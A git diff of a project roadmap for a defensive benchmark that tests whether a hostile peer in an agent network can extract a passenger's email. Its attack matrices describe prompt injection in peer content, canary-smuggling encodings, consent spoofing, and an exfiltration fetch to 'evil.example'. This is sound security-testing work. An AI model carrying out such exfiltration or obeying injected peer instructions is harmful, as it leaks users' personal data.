@@ -1,24 +1,30 @@
 # Roadmap: hostile-peer DLP benchmark
 
-Status: proposed, post-submission. This closes the "no persistent audit log"
-gap in [`PROTOCOL.md`](../PROTOCOL.md) and adds an adversarial regression
-suite. It does not change the submitted demo.
+Status: **v1 implemented and measured.** `npm run benchmark:dlp` passes 12/12
+attacks and 4/4 controls on the real dispatch boundary, with a fresh canary and
+a scripted peer. It does not change the submitted demo's travel data or the
+scope of its claims.
+
+The v1 boundary is browser code plus a session audit log. It is not a
+server-side security product, not a trained DLP classifier, and not a remote
+WORM store. The remaining browser, persistence, and publisher-identity work is
+listed under [Still planned](#still-planned).
 
 ## Goal
 
 Prove, with a deterministic benchmark, that a malicious peer network cannot
-obtain the airline passenger's email, bypass consent, or execute a caller
-tool, and that every attempt leaves a verifiable audit record.
+obtain the airline passenger's email, bypass consent, or execute a caller tool,
+and that every attempt leaves a verifiable audit record.
 
-The target chain is:
+The target chain:
 
 1. A hostile peer tries to obtain the passenger email.
 2. DLP detects the protected value and blocks it at the boundary.
 3. Consent is not bypassed: no new origin or request runs without a fresh
    decision, and **Decline** still makes zero requests.
 4. The attempted tool execution is refused before it has a side effect.
-5. The audit log records the origin, request hash, DLP verdict, tool decision,
-   and a canary hash as evidence.
+5. The audit log records the origin, request hash, DLP verdict, and tool
+   decision; protected values are redacted.
 6. The benchmark reports **PASS** only when every attack is blocked and the
    legitimate flows still work.
 
@@ -26,8 +32,8 @@ The target chain is:
 
 - This is not a claim of server-side security. The runtime is browser code; a
   production deployment should mirror the same policy at a trusted gateway.
-- This is not a production DLP engine. The demo uses deterministic rules and
-  a canary, not a trained classifier.
+- This is not a production DLP engine. The demo uses deterministic rules and a
+  canary, not a trained classifier.
 - The audit log is tamper-evident within a session, not a remote WORM store.
   A production system should ship events to a server the page cannot rewrite.
 - No real inventory, payment, reservation, or email delivery.
@@ -44,212 +50,115 @@ The target chain is:
 - The caller runtime, the consent card, and the airline origin are trusted.
   Peer code and peer output are untrusted data.
 
-## Existing controls
+## What shipped in v1
 
-These are already in the runtime and should be reused, not rebuilt:
+### DLP scanner
 
-- Consent before the first peer fetch; **Decline** returns without a request.
-- Per-hop `allowed_peers`; an unlisted origin fails closed.
-- Only the declared request text crosses; `sly_data` is filtered by
-  `allow.to_downstream.sly_data` and redacted in traces.
-- Coded tools run in a module worker with no DOM, no storage, no network:
-  `default-src 'none'; script-src blob:; connect-src 'none'; worker-src 'none'`.
-- The action bridge uses an iframe and origin-checked `postMessage`.
-- Writes require `expectedVersion` and a confirmation on the owning origin.
-- `TraceBus` already records compile, model, tool, peer, consent, and error
-  spans, and exports JSON.
+`site/runtime/dlp.js` and the mirrored `peer/runtime/dlp.js`:
 
-## Gaps this roadmap closes
+- Normalize with Unicode NFKC, strip zero-width characters, URL-decode twice,
+  and decode one level of base64 before matching.
+- Rules: exact per-run canary, email addresses, `otk_`/`sk-` tokens, bearer
+  tokens, and private-key blocks. The benchmark supplies a fresh canary; the
+  page's DLP always blocks email and secret patterns even without one.
+- A block returns a refusal; the caller must not fetch, invoke, or render.
+- Audit and trace records are redacted before storage.
 
-- No DLP or PII classifier at the peer boundary.
-- No per-run canary to prove that the email did not leave.
-- Consent is not bound to a request hash, tool set, or expiry.
-- No explicit per-peer capability grant for caller tools.
-- No persistent, hash-chained audit export.
-- No adversarial regression suite for a hostile peer.
+### Boundary hooks
 
-## Design
+`site/runtime/runner.js` scans:
 
-### 1. Data classification and canary
+- the peer request before consent and before `session.invoke`;
+- `sly_data` before the peer receives it;
+- the peer response before it is rendered or its action refs are accepted;
+- coded-tool arguments and permitted `sly_data` before the sandbox;
+- MCP call arguments before the request leaves;
+- presentation payloads before they are attached.
 
-Classify values as `public`, `internal`, `pii`, or `secret`. The passenger
-email, booking code, and router key are `pii`/`secret`; room and flight data
-are `public`.
+A block emits `dlp_block` in the trace and the audit log, with the boundary,
+rule, origin, and a request hash. It never includes the protected raw value.
 
-Each benchmark run generates a unique canary:
+### Consent binding
+
+`site/runtime/engine.js` scopes **Always allow** to one exact decision:
 
 ```text
-traveler+canary-<runId>@example.invalid
+peerOrigin + kind + phase + sha256(requestText)
 ```
 
-The canary is stored only in the airline page state and used for the booking.
-It is never shown to the peer. Any appearance outside the airline origin is an
-incident. Audit events store `sha256(canary)` and a short prefix, never the raw
-value.
+The approval expires after five minutes. A different request, origin, kind, or
+phase asks again; **Decline** still returns before any fetch. The consent card
+now says **Always allow this request**, so the label matches the behavior.
 
-### 2. DLP scanner
+### Tool capability policy
 
-Add `site/runtime/dlp.js` and mirror it in `peer/runtime/dlp.js`:
+- The caller runtime already refuses a caller write from a non-top caller.
+- An unlisted peer origin fails closed through `manifestAllowsPeer` and the
+  per-hop `allowed_peers` check.
+- The hotel can execute its own actions on its own origin; caller actions stay
+  on the caller origin.
 
-- Normalize with Unicode NFKC, lowercase, strip zero-width characters,
-  URL-decode, and decode one level of base64.
-- Rules: exact canary, email, `otk_`/`sk-`/bearer tokens, private-key blocks,
-  and optional phone/ID patterns.
-- Verdicts: `allow`, `redact`, `block`.
-- Policy: peer egress blocks `pii` and `secret`; traces and audit records
-  redact; the UI may show a masked value.
-- Fail closed on scanner errors.
+The manifest-level `peer_tools` grant, signed publisher identity, and a
+per-peer `max_effect` are still planned.
 
-```js
-// before requestConsent, session.invoke, or a tool call
-const verdict = dlp.scan({ text, args, slyData, destination });
-if (verdict.action === "block") {
-  trace.note("dlp_block", {
-    origin, peerOrigin: destination, rule: verdict.rule,
-    requestHash, canaryHash,
-  });
-  return refusal("That request contains protected data and was not sent.");
-}
+### Audit log
+
+`site/runtime/audit.js`:
+
+- Append-only events: `consent_requested`, `consent_allowed`,
+  `consent_declined`, `consent_reused`, `dlp_block`, `tool_denied`,
+  `peer_fetch`.
+- `hash = sha256(canonicalJSON(event) + prevHash)`, stored as `prevHash` on the
+  next event.
+- Redaction happens before hashing, so a raw canary cannot enter the chain.
+- `export()` returns a portable JSON document; `verify()` and
+  `verifyAuditEvents()` recompute the chain.
+- The log is in memory only. IndexedDB persistence and the page's download and
+  verify buttons are still planned.
+
+### Benchmark
+
+`scripts/benchmark_dlp.mjs`, run with:
+
+```bash
+npm run benchmark:dlp
 ```
 
-### 3. Boundary hooks
-
-- `site/runtime/runner.js`: scan `requestText` before `requestConsent` and
-  before `session.invoke`; scan tool `args` before `dispatchToolCall`; scan
-  the peer result before rendering or adding proposal refs.
-- `site/runtime/kernel.js`: scan `filterSlyData` output and `redactSlyData`.
-- `site/runtime/remote.js`: check manifest, network, and bundle URLs and
-  bodies; reject a URL that contains a canary or a protected value.
-- `site/runtime/actions.js`: scan proposed action arguments in
-  `validatePresentation`.
-- `site/runtime/trace.js`: redact protected values before an event is stored
-  or exported.
-- `site/app.js`: keep the canary in the booking state; never put it in the
-  peer request, URL, or presentation.
-
-### 4. Consent binding
-
-Bind each approval to:
-
-```text
-HMAC(sessionNonce, peerOrigin + network + requestHash + toolSet + expiry)
-```
-
-- The card shows the origin from `new URL()`, the purpose, the exact request,
-  and the tools the peer may use.
-- `always` applies only to read-only network calls in this session. Writes
-  require a fresh confirmation on the owning origin.
-- A new origin, network, request hash, or tool set requires a new decision.
-- The caller renders the card; the peer cannot inject HTML or a brand before
-  approval.
-- A declined decision records `consent_declined` and returns before any fetch.
-
-### 5. Tool capability policy
-
-Add an explicit per-peer grant to the caller manifest:
-
-```json
-{
-  "peer_policy": {
-    "mode": "allowlist",
-    "allowed_peers": ["https://pham-canh.github.io."],
-    "peer_tools": {
-      "https://pham-canh.github.io.": {
-        "caller_actions": [],
-        "max_effect": "read",
-        "allow_sly_data": []
-      }
-    }
-  }
-}
-```
-
-- A peer may execute its own actions on its own origin; caller actions are
-  denied by default.
-- `book_flight`, `send_email`, and `read_profile` are caller-only.
-- An unknown tool, an unlisted action, or an effect above `max_effect` emits
-  `tool_denied` and has no side effect.
-- No dynamic registration and no `eval`; the sandbox and action bridge remain
-  the execution boundary.
-
-### 6. Audit log
-
-Append-only events with a hash chain:
-
-```text
-hash = sha256(prevHash + canonicalJSON(event))
-```
-
-Record `consent_requested`, `consent_allowed`, `consent_declined`,
-`dlp_block`, `tool_denied`, `peer_fetch`, `peer_response`, `write_confirmed`,
-`write_refused`, and `benchmark_result`. Each event includes:
-
-```json
-{
-  "id": "evt_...",
-  "ts": "2026-...Z",
-  "kind": "dlp_block",
-  "origin": "https://pham-canh.github.io",
-  "peerOrigin": "https://pham-canh.github.io.",
-  "policy": "dlp/v1",
-  "requestHash": "sha256:...",
-  "canaryHash": "sha256:...",
-  "verdict": "block",
-  "rule": "email",
-  "tool": null,
-  "prevHash": "...",
-  "hash": "..."
-}
-```
-
-The page gets **Download audit log** and **Verify chain** buttons. Events are
-kept in memory and IndexedDB; PII is redacted or hashed. The UI states that
-this is a session log, not a remote attestation.
+It runs the real `dispatchToolCall` with a scripted peer, no model key, and no
+network. It writes `artifacts/dlp-benchmark.json` and exits non-zero unless
+every condition holds. The committed run is
+[`docs/dlp-benchmark.json`](dlp-benchmark.json); regenerate it with
+`DLP_REPORT=docs/dlp-benchmark.json npm run benchmark:dlp`.
 
 ## Attack matrix
 
+These are the v1 cases, all implemented and exercised by the benchmark.
+
 | ID | Attack | Expected result |
 | --- | --- | --- |
-| A1 | Peer asks the caller model to send the passenger email in the next request | `dlp_block`; the email never enters the peer request |
-| A2 | Prompt injection in a room description asks for `book_flight` with the email | `tool_denied` and `dlp_block`; no booking |
-| A3 | Peer coded tool reads `document.querySelector("#passenger-email")` | sandbox error; no DOM |
-| A4 | Peer coded tool reads `localStorage` | sandbox error; no storage |
-| A5 | Peer coded tool fetches `https://evil.example/?e=<email>` | CSP blocks; no network |
-| A6 | Peer returns a link with the canary in the query string | `dlp_block`; link is not rendered |
-| A7 | Peer tries a second origin without consent | `policy_denied`; no fetch |
-| A8 | Peer replays an approval for a different request or origin | `consent_invalid`; no fetch |
-| A9 | Peer spoofs the consent card with its own HTML or brand | caller card wins; origin comes from the URL |
-| A10 | Peer asks for the router API key | `dlp_block`; key stays in the airline origin |
-| A11 | Peer invokes a caller write tool | `tool_denied`; zero state change |
-| A12 | An exported audit event is modified after the run | chain verification fails; `audit_tamper_detected` |
+| A1 | Canary email in the peer request | `dlp_block`; no consent, no fetch |
+| A2 | URL-encoded canary in the peer request | `dlp_block`; no fetch |
+| A3 | Zero-width canary in the peer request | `dlp_block`; no fetch |
+| A4 | Base64 canary in the peer request | `dlp_block`; no fetch |
+| A5 | Canary in the peer response | `dlp_block`; response is not rendered |
+| A6 | Canary in coded-tool arguments | `dlp_block`; sandbox is not invoked |
+| A7 | Canary in `sly_data` | `dlp_block` after consent, before invoke |
+| A8 | Router `otk_` key in the peer request | `dlp_block`; key stays on the caller origin |
+| A9 | Bearer token in the peer request | `dlp_block` |
+| A10 | Peer invokes the caller booking tool | `tool_denied`; zero writes |
+| A11 | Peer tries an unlisted second origin | `policy_denied`; no fetch |
+| A12 | An exported audit event is edited | chain verification fails |
 
 Controls:
 
 | ID | Flow | Expected result |
 | --- | --- | --- |
-| C1 | Legitimate hotel question with no PII | consent, allow, hotel answer; 11 requests |
+| C1 | Legitimate hotel question with no PII | consent, allow, hotel answer |
 | C2 | Visitor declines | zero hotel requests |
-| C3 | Airline booking with the canary email on the airline origin | user confirms; booking succeeds; email never sent to the hotel |
-| C4 | Manual pages without a model key | flight booking and room request still work |
+| C3 | Clean coded tool with no PII | sandbox runs once, result returns |
+| C4 | Audit chain with a canary field | verifies, raw canary absent |
 
-## Benchmark
-
-Add `npm run benchmark:dlp`, which runs:
-
-- `tests/dlp.test.mjs`: scanner, policy, canary, audit chain.
-- `tests/benchmark_dlp.spec.mjs`: Playwright against the real pages and a
-  `fixtures/evil-hotel/` network with a scripted model.
-
-The runner writes `artifacts/dlp-benchmark.json` and a table:
-
-```text
-case  attack                              expected        observed        result
-A1    peer asks for the email             dlp_block       dlp_block       PASS
-...
-C1    legitimate hotel question           allow           11 requests     PASS
-```
-
-PASS requires:
+## PASS criteria
 
 - 12/12 attacks blocked.
 - 0 canary egress.
@@ -261,45 +170,42 @@ PASS requires:
 - The process exits 0 only when every condition holds.
 
 The benchmark uses a scripted model and no network key, so it is deterministic
-and can run in CI. A separate manual run can repeat the same cases against a
-live Otari key.
+and runs in CI. A separate manual run can repeat the same cases against a live
+Otari key; that is not claimed here.
 
-## Implementation phases
+## Still planned
 
-0. **Spec and fixtures.** Add the policy schema, the canary generator, and
-   `fixtures/evil-hotel/` with a malicious network and coded tool.
-1. **DLP module.** Add `dlp.js`, unit tests, normalization, and fail-closed
-   behavior.
-2. **Boundary hooks.** Scan peer egress, tool args, `sly_data`, peer output,
-   and trace writes.
-3. **Consent and tools.** Bind approvals; add the per-peer capability grant;
-   deny caller writes by default.
-4. **Audit log.** Add the hash chain, redaction, IndexedDB persistence, export,
-   and verification.
-5. **Benchmark and CI.** Add the Playwright matrix, the report artifact, and a
-   `dlp-benchmark` job. Update `PROTOCOL.md` and the README with the measured
-   result, not a claim.
+- **Browser matrix.** A Playwright pass against both real pages and a
+  `fixtures/evil-hotel/` network with a scripted model, covering the sandbox
+  DOM/storage/network attempts, a spoofed consent card, and the actual UI.
+- **Audit persistence and UI.** IndexedDB storage plus **Download audit log**
+  and **Verify chain** buttons, with a visible "session log, not remote
+  attestation" note.
+- **Per-peer capability grant.** A manifest `peer_tools` map with
+  `caller_actions`, `max_effect`, and `allow_sly_data`, denied by default.
+- **Publisher identity.** Signed manifests and a pinned publisher key.
+- **Remote audit sink.** Ship the same hash-chained events to a trusted server
+  the page cannot rewrite.
+- **Live-key run.** Repeat the matrix against a live Otari key and record it.
 
-Estimate: 5–7 focused days for one developer, with the existing runtime and
-test harness. This is a plan, not a commitment.
+## Definition of done for v1
 
-## Definition of done
-
-- `npm run benchmark:dlp` exits 0 and produces the report.
-- `audit.json` verifies; the raw canary never appears.
-- CI runs the benchmark on every push.
-- The legitimate hotel flow and the manual pages still pass.
-- `PROTOCOL.md` moves "no persistent audit log" from a limitation to a
-  measured, scoped capability, with the remote-log caveat intact.
-- A short demo shows the attack, the block, the consent decision, the denied
-  tool, the audit event, and the PASS table.
+- [x] `npm run benchmark:dlp` exits 0 and writes the report.
+- [x] The raw canary never appears in the audit export.
+- [x] CI runs `npm test` and the benchmark on every push.
+- [x] The legitimate hotel flow and the manual pages still pass.
+- [x] `PROTOCOL.md` states the scoped audit capability and the remote-log
+      caveat.
+- [ ] A short demo shows the attack, the block, the consent decision, the
+      denied tool, the audit event, and the PASS table. The terminal table is
+      available today; the browser UI is still planned.
 
 ## Demo script
 
-1. Book a flight with the canary email on the airline origin.
-2. Ask the hotel; show the consent card with the exact origin and request.
-3. Allow; the hostile peer tries A1, A2, A5, and A11.
-4. Show the DLP banner, the denied tool, and the unchanged consent state.
-5. Open the audit panel; download and verify the chain.
-6. Run `npm run benchmark:dlp`; show 12/12 attacks blocked and 4/4 controls
+1. Run `npm run benchmark:dlp`; show 12/12 attacks blocked and 4/4 controls
    passing.
+2. Book a flight manually on the airline origin.
+3. Ask the hotel; show the consent card with the exact origin and request.
+4. Allow; show the hotel answer and the trace.
+5. In a terminal, show a blocked canary request and the redacted audit export.
+6. State the boundary: session audit, deterministic rules, no remote WORM.
